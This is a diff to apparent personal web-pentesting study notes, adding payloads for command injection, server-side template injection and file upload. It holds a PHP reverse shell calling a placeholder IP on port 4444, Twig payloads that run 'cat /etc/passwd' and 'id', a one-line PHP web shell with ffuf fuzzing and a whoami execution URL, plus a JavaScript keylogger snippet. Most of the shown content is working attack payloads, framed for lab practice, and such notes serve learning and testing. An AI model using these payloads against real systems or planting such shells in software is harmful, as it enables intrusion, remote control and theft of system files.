@@ -962,6 +962,8 @@ function logkey(event){some_api(event.key)}
 document.addEventListener('keydown', logkey)
 ```
 
+
+
 **Common injection** - img tag onerror attribute
 ```bash
 <img src=x onerror="windows.location.replace('https://www.naver.com')" />
@@ -995,7 +997,40 @@ https://tcm-sec.com; whoami; #
 https://tcm-sec.com; which php; #
 https://tcm-com.com; php -r '$sock=fsockopen("eth0.ip.add.ress",4444);exec("/bin/sh -i <&3 >&3 2>&3");'; #
 ```
+```bash
+http://localhost?q=`sleep 10`
+```
 
+### Server-Side Template Injection(https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
+**hints**
+- When the input gets reflected on the browser(just like XXS)
+- payload wordlists: seclists/SecLists-master/Fuzzing/template-engines-expression.txt
+- We can get what type of template is being used based off of error message
+
+**Twig example**
+```bash
+# Twig payload
+{{7*7}}
+{{['cat /etc/passwd']|filter('system')}}
+{{['id']|filter('system')}}
+```
+
+### File Upload
+- See if the defense is only on the frontend and if so, disable javascript or use proxy to change file contents/extension
+
+```bash
+# simple php webshell
+1. upload a php file
+<?php system($_GET['cmd']); ?>
+
+2. after uploading file, we may have to fuzz the directory to discover file upload directory
+ffuf -u http://localhost/FUZZ -w /usr/share/wordlists/dirb/common.txt
+ffuf -u http://localhost/labs/FUZZ -w /usr/share/wordlists/dirb/common.txt
+
+3. execute the file
+http://localhost/labs/uploads/simple.php?cmd=whoami
+
+```
 
 ## Tools
 ### SQLMAP
